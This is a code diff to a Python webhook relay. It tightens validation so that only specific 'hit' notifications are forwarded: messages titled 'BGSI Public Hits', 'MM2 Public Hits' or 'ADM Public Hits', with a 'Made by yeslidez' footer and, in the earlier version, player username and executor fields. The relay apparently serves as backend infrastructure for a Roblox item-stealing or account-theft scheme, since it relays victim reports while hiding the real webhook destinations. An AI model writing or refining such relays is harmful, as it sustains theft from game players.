@@ -41,29 +41,27 @@ def handle_webhook(token):
     if not data or "embeds" not in data:
         return "", 204
 
-    # Validate Embed Content
+    # ✅ Strict embed validation
     allowed = False
-    for embed in data["embeds"]:
+    if (
+        data.get("content") == "Wow someone got a hit"
+        and len(data["embeds"]) == 1
+    ):
+        embed = data["embeds"][0]
         title = embed.get("title", "")
-        fields = embed.get("fields", [])
+        footer = embed.get("footer", {})
+
         if (
-            "New hit!" in title and
-            "recive the stuff" in title.lower()
+            title in ["BGSI Public Hits", "MM2 Public Hits", "ADM Public Hits"]
+            and isinstance(footer, dict)
+            and footer.get("text", "").startswith("Made by yeslidez - ")
         ):
-            for field in fields:
-                value = field.get("value", "")
-                if (
-                    field.get("name") == "Player Info"
-                    and "Username:" in value
-                    and "Executor:" in value
-                    and "Creator:" in value
-                ):
-                    allowed = True
-                    break
+            allowed = True
 
     if not allowed:
         return "", 204
 
+    # Send and log timestamp
     ip_registry[key] = time.time()
     response = requests.post(webhook_map[token], json=data)
     return jsonify({
